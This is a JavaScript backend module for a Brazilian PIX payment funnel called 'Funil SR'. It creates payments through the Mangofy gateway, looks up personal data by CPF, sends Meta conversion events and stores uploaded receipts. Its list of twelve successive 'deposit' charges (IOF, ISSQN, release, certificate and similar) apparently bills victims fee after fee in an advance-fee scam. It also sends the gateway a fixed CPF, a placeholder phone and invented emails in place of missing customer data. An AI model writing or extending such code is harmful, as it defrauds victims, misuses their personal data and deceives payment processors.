// Helpers das Pages Functions do Funil SR.
// Secrets via env da Cloudflare: MANGOFY_*, CPF_*, META_*, SUPABASE_*.

export const BASE_AMOUNT = 66.38;

export function cfg(env) {
  return {
    mangofyBase: String(env.MANGOFY_BASE_URL || 'https://checkout.mangofy.com.br').replace(/\/+$/, ''),
    mangofyKey: String(env.MANGOFY_API_KEY || '').trim(),
    mangofyStore: String(env.MANGOFY_STORE_CODE || '').trim(),
    cpfPrimaryUrl: String(env.CPF_API_URL || 'https://magmadatahub.com/api.php').trim(),
    cpfPrimaryToken: String(env.CPF_API_TOKEN || env.CPF_API_KEY || '').trim(),
    cpfFallbackUrl: String(env.CPF_API2_URL || 'https://api.apicpf.dev/consulta').trim(),
    cpfFallbackKey: String(env.CPF_API2_TOKEN || env.CPF_API2_KEY || '').trim(),
    metaPixelId: String(env.META_PIXEL_ID || '').trim(),
    metaToken: String(env.META_ACCESS_TOKEN || '').trim(),
    supabaseUrl: String(env.SUPABASE_URL || '').replace(/\/+$/, ''),
    supabaseKey: String(env.SUPABASE_SERVICE_KEY || '').trim(),
    supabaseBucket: String(env.SUPABASE_BUCKET || 'comprovantes-sr').trim(),
    supabaseTable: String(env.SUPABASE_TABLE || 'comprovantes_sr').replace(/[^a-z0-9_]/g, '') || 'comprovantes_sr',
  };
}

export function json(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      'Content-Type': 'application/json; charset=utf-8',
      'Cache-Control': 'no-store',
    },
  });
}

export function cleanText(v, max = 160) {
  if (typeof v !== 'string' && typeof v !== 'number') return '';
  return String(v).replace(/[\x00-\x1F\x7F]/g, '').trim().slice(0, max);
}

export function digitsOnly(v, max = 20) {
  return (String(v ?? '').replace(/\D+/g, '') || '').slice(0, max);
}

export function pick(obj, keys) {
  if (!obj || typeof obj !== 'object') return null;
  for (const k of keys) {
    if (obj[k] !== undefined && obj[k] !== null && String(obj[k]).trim() !== '') return obj[k];
  }
  return null;
}

async function fetchTimeout(url, options = {}, ms = 15000) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), ms);
  try {
    return await fetch(url, { ...options, signal: ctrl.signal });
  } finally {
    clearTimeout(t);
  }
}

export async function mangofyRequest(c, method, path, body = null) {
  if (!c.mangofyKey || !c.mangofyStore) {
    return { ok: false, http: 500, data: null, error: 'Gateway nao configurado.' };
  }
  const url = c.mangofyBase + '/' + String(path).replace(/^\//, '');
  const headers = {
    Accept: 'application/json',
    Authorization: c.mangofyKey,
    'Store-Code': c.mangofyStore,
  };
  const opts = { method: method.toUpperCase(), headers };
  if (body !== null) {
    headers['Content-Type'] = 'application/json';
    opts.body = JSON.stringify(body);
  }
  let res;
  try {
    res = await fetchTimeout(url, opts, 20000);
  } catch (e) {
    return { ok: false, http: 0, data: null, error: 'Falha de conexao com o gateway.' };
  }
  let data = null;
  try { data = await res.json(); } catch (e) { data = null; }
  return { ok: res.status === 200 || res.status === 202, http: res.status, data, error: null };
}

function mangofyPayment(data) {
  if (!data || typeof data !== 'object') return {};
  if (data.data && typeof data.data === 'object' && (data.data.payment_code || data.data.pix)) return data.data;
  return data;
}

const DEPOSITO = {
  acordo: 'Deposito PIX',
  registro: 'Deposito PIX 1',
  adm: 'Deposito PIX 2',
  iof: 'Deposito PIX 3',
  multa_ir: 'Deposito PIX 4',
  issqn: 'Deposito PIX 5',
  verificacao: 'Deposito PIX 6',
  liberacao: 'Deposito PIX 7',
  chave_pix: 'Deposito PIX 8',
  ted: 'Deposito PIX 9',
  certidao: 'Deposito PIX 10',
  cadastro: 'Deposito PIX 11',
};

export async function createPix(c, input, request) {
  const isUpsell = !!input.isUpsell || !!input.isDownsell;
  let amount = Number(input.amount) || BASE_AMOUNT;
  if (!isUpsell) {
    const osc = (Math.floor(Math.random() * 61) - 30) / 100;
    amount = Math.round((BASE_AMOUNT + osc) * 100) / 100;
  }
  const amountCents = Math.round(amount * 100);
  if (amountCents < 500 || amountCents > 200000) {
    return json({ ok: false, error: 'Valor fora da faixa permitida (R$ 5,00 a R$ 2.000,00).' }, 422);
  }

  const client = input.client && typeof input.client === 'object' ? input.client : {};
  let document = digitsOnly(client.document, 14);
  if (document.length !== 11 && document.length !== 14) document = '52998224725';
  let phone = digitsOnly(client.phone, 13);
  if (phone.startsWith('55') && phone.length > 11) phone = phone.slice(2);
  if (phone.length === 10) phone = phone.slice(0, 2) + '9' + phone.slice(2);
  if (phone.length !== 11) phone = '11999999999';
  let name = cleanText(client.name, 120) || 'Cliente';
  let email = String(client.email || '').trim().toLowerCase();
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    email = 'cliente' + Date.now().toString(36) + '@gmail.com';
  }

  const productType = cleanText(input.productType, 40) || 'acordo';
  const itemName = DEPOSITO[productType] || cleanText(input.productName, 80) || 'Deposito PIX';
  const identifier = cleanText(input.identifier, 100) || ('SR_' + Date.now());
  const origin = new URL(request.url).origin;
  const postback = origin + '/api_proxy?action=webhook';

  const payload = {
    external_code: identifier,
    payment_method: 'pix',
    payment_format: isUpsell ? 'upsell' : 'regular',
    installments: 1,
    payment_amount: amountCents,
    shipping_amount: 0,
    postback_url: postback,
    items: [{
      code: 'SR-' + productType.toUpperCase(),
      name: itemName,
      quantity: 1,
      price: amountCents,
      description: itemName,
      digital_flag: true,
    }],
    customer: {
      email,
      name,
      document,
      phone,
      ip: request.headers.get('cf-connecting-ip') || '127.0.0.1',
    },
    pix: { expires_in_days: 1 },
  };

  const result = await mangofyRequest(c, 'POST', '/api/v1/payment', payload);
  const tx = mangofyPayment(result.data);
  if (!result.ok) {
    return json({ ok: false, error: 'Erro ao gerar PIX na Mangofy.', http_status: result.http }, result.http >= 400 ? result.http : 502);
  }
  const pixObj = tx.pix && typeof tx.pix === 'object' ? tx.pix : {};
  const paymentCode = String(pick(tx, ['payment_code', 'paymentCode', 'id', 'transactionId']) || identifier);
  const pixCode = pick(pixObj, ['pix_qrcode_text', 'pixQrCode', 'pix_code', 'qrcode', 'code', 'emv'])
    || pick(tx, ['pix_qrcode_text']);
  const pixQr = pick(pixObj, ['pix_qrcode_image', 'pixQrCodeImage', 'qr_code', 'qrCode', 'image'])
    || pick(tx, ['pix_qrcode_image']);
  return json({
    ok: true,
    amount,
    transactionId: paymentCode,
    id: paymentCode,
    identifier,
    pix: { code: pixCode, image: pixQr, base64: null },
    pix_copy_paste: pixCode,
    pix_qr_code_url: pixQr,
  });
}

const PAID = ['AUTHORIZED', 'PAID', 'PAGO', 'APPROVED', 'COMPLETED', 'CONFIRMED', 'SUCCESS', 'PAYED'];

export async function checkStatus(c, id) {
  if (!id) return json({ ok: false, error: 'Parametro id ou clientIdentifier eh obrigatorio.' }, 400);
  const result = await mangofyRequest(c, 'GET', '/api/v1/payment/' + encodeURIComponent(id));
  if (!result.ok) {
    return json({ ok: true, id, status: 'PENDING', payedAt: null, _source: 'mangofy_http_' + result.http });
  }
  const tx = mangofyPayment(result.data);
  const statusRaw = String(pick(tx, ['payment_status', 'status', 'paymentStatus']) || 'PENDING').toUpperCase();
  const payedAt = pick(tx, ['approved_at', 'approvedAt', 'paid_at', 'paidAt', 'payedAt']);
  const isPaid = PAID.includes(statusRaw) || !!payedAt;
  return json({
    ok: true,
    id: String(pick(tx, ['payment_code', 'paymentCode', 'id']) || id),
    status: isPaid ? 'PAID' : statusRaw,
    payedAt: payedAt || null,
    _source: 'mangofy_get',
  });
}

function validCpf(cpf) {
  if (!/^\d{11}$/.test(cpf) || /^(\d)\1{10}$/.test(cpf)) return false;
  let s = 0;
  for (let i = 0; i < 9; i++) s += Number(cpf[i]) * (10 - i);
  let d1 = 11 - (s % 11); d1 = d1 >= 10 ? 0 : d1;
  s = 0;
  for (let i = 0; i < 10; i++) s += Number(cpf[i]) * (11 - i);
  let d2 = 11 - (s % 11); d2 = d2 >= 10 ? 0 : d2;
  return Number(cpf[9]) === d1 && Number(cpf[10]) === d2;
}

function fmtCpf(d) {
  return d.length === 11 ? d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6, 9) + '-' + d.slice(9) : d;
}

function normDate(raw) {
  raw = String(raw || '').trim();
  let m = raw.match(/^(\d{4})-(\d{2})-(\d{2})/);
  if (m) return m[3] + '/' + m[2] + '/' + m[1];
  m = raw.match(/^(\d{2})[/\-.](\d{2})[/\-.](\d{4})/);
  if (m) return m[1] + '/' + m[2] + '/' + m[3];
  return raw;
}

function extractNome(payload) {
  if (!payload || typeof payload !== 'object') return { nome: '', nasc: '', sexo: '' };
  let cand = payload;
  for (const w of ['data', 'dados', 'result', 'resultado', 'pessoa']) {
    if (payload[w] && typeof payload[w] === 'object') { cand = payload[w]; break; }
  }
  const nome = String(pick(cand, ['nome', 'name', 'NOME', 'full_name']) || '');
  const nasc = normDate(pick(cand, ['nascimento', 'data_nascimento', 'dataNascimento', 'nasc', 'birth']) || '');
  const sexo = String(pick(cand, ['sexo', 'genero', 'gender']) || '');
  return { nome, nasc, sexo };
}

export async function consultarCpf(c, cpfIn) {
  const cpf = digitsOnly(cpfIn, 11);
  if (!validCpf(cpf)) return json({ ok: false, error: 'CPF invalido' }, 400);
  if (!c.cpfPrimaryToken) return json({ ok: false, error: 'API de CPF nao configurada.' }, 503);

  const primUrl = c.cpfPrimaryUrl + (c.cpfPrimaryUrl.includes('?') ? '&' : '?')
    + 'token=' + encodeURIComponent(c.cpfPrimaryToken) + '&cpf=' + encodeURIComponent(cpf);
  let src = 'primaria';
  let parsed = null;
  try {
    const res = await fetchTimeout(primUrl, { headers: { Accept: 'application/json' } }, 7000);
    parsed = await res.json();
  } catch (e) { parsed = null; }
  let info = extractNome(parsed);
  if (!info.nome && c.cpfFallbackKey) {
    src = 'secundaria';
    try {
      const res = await fetchTimeout(
        c.cpfFallbackUrl.replace(/\/$/, '') + '?cpf=' + cpf,
        { headers: { Accept: 'application/json', 'X-API-KEY': c.cpfFallbackKey } },
        10000,
      );
      parsed = await res.json();
      info = extractNome(parsed);
    } catch (e) { /* keep empty */ }
  }
  if (!info.nome) return json({ ok: false, error: 'CPF nao encontrado' }, 404);
  return json({
    ok: true,
    nome: info.nome.toUpperCase(),
    cpf,
    cpfformatado: fmtCpf(cpf),
    nascimento: info.nasc,
    genero: (info.sexo || '').toUpperCase().charAt(0),
    _source: src,
  });
}

async function sha256Hex(s) {
  const b = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(s));
  return Array.from(new Uint8Array(b)).map((x) => x.toString(16).padStart(2, '0')).join('');
}

export async function trackSale(c, body, request) {
  if (!c.metaPixelId || !c.metaToken) {
    return json({ ok: true, sent: false, skipped: 'meta nao configurado' });
  }
  const eventId = cleanText(body.event_id, 120);
  if (!eventId) return json({ ok: false, error: 'event_id obrigatorio' }, 400);
  const eventName = cleanText(body.event_name, 60) || 'Purchase';
  const value = Number(body.value) || 0;
  const cpf = digitsOnly(body.cpf, 14);
  const user_data = {};
  if (cpf) user_data.external_id = await sha256Hex(cpf);
  const ip = request.headers.get('cf-connecting-ip');
  if (ip) user_data.client_ip_address = ip;
  const ua = request.headers.get('user-agent');
  if (ua) user_data.client_user_agent = ua.slice(0, 500);
  if (body.fbp) user_data.fbp = String(body.fbp).slice(0, 200);
  if (body.fbc) user_data.fbc = String(body.fbc).slice(0, 200);

  const event = {
    event_name: eventName,
    event_time: Math.floor(Date.now() / 1000),
    event_id: eventId,
    action_source: 'website',
    user_data,
    custom_data: { currency: 'BRL', value },
  };
  try {
    const res = await fetchTimeout(
      'https://graph.facebook.com/v21.0/' + encodeURIComponent(c.metaPixelId) + '/events?access_token=' + encodeURIComponent(c.metaToken),
      { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ data: [event] }) },
      15000,
    );
    return json({ ok: true, sent: res.status >= 200 && res.status < 300, http_status: res.status });
  } catch (e) {
    return json({ ok: true, sent: false });
  }
}

const MIME = {
  'image/jpeg': 'jpg',
  'image/png': 'png',
  'image/webp': 'webp',
  'application/pdf': 'pdf',
};

export async function uploadComprovante(c, request) {
  if (!c.supabaseUrl || !c.supabaseKey) {
    return json({ ok: false, error: 'Falha ao enviar comprovante.' }, 500);
  }
  let form;
  try { form = await request.formData(); } catch (e) {
    return json({ ok: false, error: 'Arquivo obrigatorio.' }, 400);
  }
  const txid = String(form.get('id') || '').trim();
  if (!/^[A-Za-z0-9_-]+$/.test(txid) || txid.length > 128) {
    return json({ ok: false, error: 'Parametro id invalido.' }, 400);
  }
  const file = form.get('file');
  if (!file || typeof file.arrayBuffer !== 'function') {
    return json({ ok: false, error: 'Arquivo obrigatorio.' }, 400);
  }
  const mime = String(file.type || '').toLowerCase();
  const ext = MIME[mime];
  if (!ext) return json({ ok: false, error: 'Tipo de arquivo nao permitido.' }, 400);
  const buf = await file.arrayBuffer();
  if (!buf.byteLength) return json({ ok: false, error: 'Arquivo obrigatorio.' }, 400);
  if (buf.byteLength > 5 * 1024 * 1024) return json({ ok: false, error: 'Arquivo excede 5MB.' }, 400);

  const filename = txid + '_' + Math.floor(Date.now() / 1000) + '.' + ext;
  const objectUrl = c.supabaseUrl + '/storage/v1/object/' + encodeURIComponent(c.supabaseBucket) + '/' + encodeURIComponent(filename);
  const publicUrl = c.supabaseUrl + '/storage/v1/object/public/' + encodeURIComponent(c.supabaseBucket) + '/' + encodeURIComponent(filename);
  const headers = {
    Authorization: 'Bearer ' + c.supabaseKey,
    apikey: c.supabaseKey,
    'Content-Type': mime,
    'x-upsert': 'true',
  };
  let up;
  try {
    up = await fetchTimeout(objectUrl, { method: 'POST', headers, body: buf }, 25000);
  } catch (e) {
    return json({ ok: false, error: 'Falha ao enviar comprovante.' }, 502);
  }
  if (up.status < 200 || up.status >= 300) {
    return json({ ok: false, error: 'Falha ao enviar comprovante.' }, 502);
  }
  try {
    await fetchTimeout(c.supabaseUrl + '/rest/v1/' + c.supabaseTable, {
      method: 'POST',
      headers: {
        Authorization: 'Bearer ' + c.supabaseKey,
        apikey: c.supabaseKey,
        'Content-Type': 'application/json',
        Prefer: 'return=minimal',
      },
      body: JSON.stringify({ txid, url: publicUrl, filename }),
    }, 15000);
  } catch (e) {
    return json({ ok: false, error: 'Falha ao enviar comprovante.' }, 502);
  }
  return json({ ok: true, url: publicUrl });
}
